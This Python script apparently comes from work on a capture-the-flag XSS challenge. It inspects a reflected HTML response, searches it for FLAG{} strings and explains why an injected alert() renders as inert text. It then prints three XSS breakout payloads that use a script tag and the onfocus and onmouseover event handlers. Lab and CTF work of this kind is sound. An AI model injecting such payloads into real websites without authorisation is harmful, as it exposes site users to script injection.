import re

# The provided HTML
html = '''
    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss25.css">
            <title>Dalgona - Star</title>
        </head>
        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form" method="post">
                    <img class="text-img" src="static/img/logo5_white.png">
                    
                    <div class="solution-text"><img src="static/img/cookies/error_star.png" alt="Fail" width="150" height="150"><br>Failed! Try again!</div>
                    <input type=text name=solution placeholder="Enter solution..." > alert("XSS")>
                </form>
            </div>
        </div>
    </html>
'''

print("XSS REFLECTION ANALYSIS")
print("=" * 60)

# 1. Find the line where alert("XSS") appears
print("\n[1] LOCATION OF alert(\"XSS\")")
line_num = 0
for i, line in enumerate(html.split('\n'), 1):
    if 'alert("XSS")' in line:
        line_num = i
        print(f"Line {i}: {line.strip()}")

# 2. Analyze the context
print("\n[2] PAYLOAD LOCATION ANALYSIS")
# Check if it's inside the placeholder attribute or outside
input_tag_match = re.search(r'<input[^>]*>', html)
if input_tag_match:
    input_tag = input_tag_match.group(0)
    print(f"Input tag: {input_tag}")
    
    # Check if alert("XSS") is in the input tag
    if 'alert("XSS")' in input_tag:
        print("STATUS: Payload is INSIDE the input tag")
        # Check which attribute
        if 'placeholder' in input_tag and 'alert' in input_tag:
            print("SPECIFICALLY: Inside the 'placeholder' attribute")
    else:
        print("STATUS: Payload is OUTSIDE the input tag")
        print("This means it's rendered as plain text, not JavaScript")

# 3. Search for FLAG patterns
print("\n[3] SEARCH FOR FLAG{} PATTERNS")
flags = re.findall(r'FLAG\{[^}]+\}', html)
if flags:
    print(f"Found {len(flags)} FLAG pattern(s):")
    for flag in flags:
        print(f"  {flag}")
else:
    print("No FLAG{} patterns found")

# 4. Why it doesn't execute
print("\n[4] WHY IT DOESN'T EXECUTE")
print("The payload appears AFTER the input tag closes:")
print("  <input ... > alert(\"XSS\")>")
print()
print("This renders as literal text on the page because:")
print("- It's not in <script> tags")
print("- It's not in an event handler (onclick, onload, etc.)")
print("- It's not in a javascript: URL")
print("- It's just plain HTML text content")

# 5. Suggest proper payload format
print("\n[5] PROPER PAYLOAD FORMAT")
print("To execute JavaScript, the payload must be in an executable context:")
print()
print("Example 1 - Break out and create script tag:")
print('  \"><script>alert("XSS")</script>')
print()
print("Example 2 - Use event handler:")
print('  \" onfocus=\"alert(\\'XSS\\')')
print()
print("Example 3 - Break out of attribute:")
print('  \" onmouseover=\"alert(\\'XSS\\')//')
